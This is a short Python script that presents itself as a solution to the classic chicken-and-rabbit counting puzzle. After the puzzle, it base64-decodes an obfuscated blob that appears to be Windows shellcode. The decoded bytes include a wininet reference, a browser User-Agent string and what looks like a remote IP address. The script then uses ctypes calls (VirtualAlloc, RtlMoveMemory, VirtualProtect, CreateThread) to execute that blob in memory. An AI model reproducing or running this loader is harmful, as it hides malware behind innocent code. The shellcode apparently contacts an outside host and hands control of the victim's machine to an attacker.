import ctypes as BLtuxsfrtkyiaA
import base64
for c in range(0,31):
     if 2*c+(30-c)*4 == 90:
       print("鸡有",c,"只")
       print("兔有",30-int(c),"只")
lRjNZGFqm = base64.b64decode("/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//VMf9XV1dXV2g6Vnmn/9XphAAAAFsxyVFRagNRUWhg6gAAU1BoV4mfxv/V63BbMdJSaAACQIRSUlJTUlBo61UuO//VicaDw1Ax/1dXav9TVmgtBhh7/9WFwA+EwwEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3S3Mf/pkQEAAOnJAQAA6Iv///8vZlBFYQB3vGlgEfxoP6ksTZMSSAdwPaG6UXgiCUN4L0UuPGpLn2ik8qb7jLWX+8o87M640OaPCzDryIFyE4F0L72p7ZERFSr7MbOXNYA1AFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy4wLjA0NTA2LjMwKQ0KAAN9raRo/aZHbYCSs+il7BVbL8hu8dAC8mwYPhhI8+rKmWKFTuIWLFph6syOeyOwDmCjt3vVHtb6kJcHqDVa0XdJVoYGxDa6uOEu3jGuc/6YdFOdY6IIGacg8qjH/atm1wu4jR5SUAsuK+tJlKiXK5zRI2Po91GjMGx1s3hQYWia7Br3/ikkrTIhvoGRQ3c8uCkSQD/MmVYR/pzBxY9slC64nFY7ZPDG0YfcBV0ycvyI63DB6cv1xHVdU34ho+5ZAqQQigBo8LWiVv/VakBoABAAAGgAAEAAV2hYpFPl/9WTuQAAAAAB2VFTiedXaAAgAABTVmgSloni/9WFwHTGiwcBw4XAdeVYw+ip/f//MTMuMTEyLjQ2LjIyNwBvqlHD")
DYJlhNsI = BLtuxsfrtkyiaA.windll.kernel32.VirtualAlloc(BLtuxsfrtkyiaA.c_int(0),BLtuxsfrtkyiaA.c_int(len(lRjNZGFqm)),BLtuxsfrtkyiaA.c_int(0x3000),BLtuxsfrtkyiaA.c_int(0x04))
BLtuxsfrtkyiaA.windll.kernel32.RtlMoveMemory(BLtuxsfrtkyiaA.c_int(DYJlhNsI),lRjNZGFqm,BLtuxsfrtkyiaA.c_int(len(lRjNZGFqm)))
nJosRQBeh = BLtuxsfrtkyiaA.windll.kernel32.VirtualProtect(BLtuxsfrtkyiaA.c_int(DYJlhNsI),BLtuxsfrtkyiaA.c_int(len(lRjNZGFqm)),BLtuxsfrtkyiaA.c_int(0x20),BLtuxsfrtkyiaA.byref(BLtuxsfrtkyiaA.c_uint32(0)))
DLCfbiADxqaKv = BLtuxsfrtkyiaA.windll.kernel32.CreateThread(BLtuxsfrtkyiaA.c_int(0),BLtuxsfrtkyiaA.c_int(0),BLtuxsfrtkyiaA.c_int(DYJlhNsI),BLtuxsfrtkyiaA.c_int(0),BLtuxsfrtkyiaA.c_int(0),BLtuxsfrtkyiaA.pointer(BLtuxsfrtkyiaA.c_int(0)))
BLtuxsfrtkyiaA.windll.kernel32.WaitForSingleObject(BLtuxsfrtkyiaA.c_int(DLCfbiADxqaKv),BLtuxsfrtkyiaA.c_int(-1))


